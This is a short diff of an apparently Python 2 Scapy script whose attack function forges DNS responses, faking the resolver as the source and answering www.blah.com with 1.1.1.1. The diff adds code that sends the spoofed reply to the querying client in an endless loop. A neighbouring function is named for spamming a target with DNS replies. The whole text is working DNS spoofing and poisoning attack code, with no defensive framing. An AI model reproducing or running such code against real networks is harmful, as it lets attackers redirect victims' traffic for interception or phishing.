@@ -32,7 +32,9 @@ def attack(packet):
 	print "****DNS****"
 	print packet[DNS].qd
 	'''
-	DNSResp=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport)/DNS(qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname="www.blah.com", qtype="A", qclass="IN"), an=DNSQR(rrname="www.blah.com", type="A", rclass="IN",ttl=3599, rdata="1.1.1.1" ))
+	print "Caught one sending one..."
+	poison=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport)/DNS(qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname="www.blah.com", qtype="A", qclass="IN"), an=DNSRR(rrname="www.blah.com", type="A", rclass="IN",ttl=3599, rdata="1.1.1.1" ))
+	send(poison, inter=0, loop=1, verbose=0)
 
 #spam client with DNS replies
 def spam_replies(evil_ip, target):
